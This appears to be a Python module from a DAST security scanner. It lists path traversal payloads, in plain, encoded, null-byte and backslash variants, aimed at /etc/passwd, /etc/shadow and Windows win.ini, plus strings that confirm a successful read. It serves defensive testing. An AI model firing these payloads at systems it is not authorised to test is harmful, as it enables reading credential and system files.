"""
DevSecure360 — DAST Path Traversal Payloads
=============================================
Sources: OWASP Testing Guide WSTG-ATHZ-01, PayloadsAllTheThings LFI corpus.
"""


def get_payloads() -> list:
    """
    Path traversal payloads targeting /etc/passwd (Linux) and win.ini (Windows).
    Confirmed when response contains 'root:x:0:0' or '[extensions]'.
    """
    return [
        # Standard Unix traversal
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",

        # URL-encoded
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",

        # Double-encoded
        "..%252F..%252F..%252Fetc%252Fpasswd",

        # Null byte injection (older PHP/CGI apps)
        "../../../etc/passwd%00",
        "../../../etc/passwd\x00",

        # Unicode encoding
        "\u002e\u002e/\u002e\u002e/etc/passwd",

        # Dot-dot-slash with backslash mix
        "..\\..\\..\\etc\\passwd",

        # Windows targets
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",

        # Linux /etc/shadow (highly privileged but confirms traversal)
        "../../../etc/shadow",

        # Absolute path bypass attempts
        "/etc/passwd",
        "/etc/passwd%00",
    ]


LINUX_ORACLE_STRINGS = ["root:x:0:0:", "root:!:0:0:", "/bin/bash", "/bin/sh"]
WINDOWS_ORACLE_STRINGS = ["[extensions]", "[boot loader]", "[operating systems]", "MSDOS.SYS"]
